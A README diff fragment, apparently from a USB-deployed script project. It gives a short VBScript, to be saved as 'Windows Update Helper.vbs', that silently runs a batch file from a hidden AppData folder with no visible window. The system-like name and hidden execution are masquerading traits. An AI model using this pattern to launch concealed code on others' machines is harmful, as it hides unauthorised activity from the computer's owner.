@@ -46,9 +46,7 @@ recommended to do this and then pull out the usb and put it back in
 if you wish to use older versions/debug versions before 4.1, either download vbs from old releases or put this in "Windows Update Helper.vbs":  
 `
 Set WshShell = CreateObject("WScript.Shell")  
-
 WshShell.Run chr(34) & "C:\Users\styso\AppData\Roaming\Microsoft\Windows\lmao.bat" & Chr(34), 0  
-
 Set WshShell = Nothing 
 `  
 
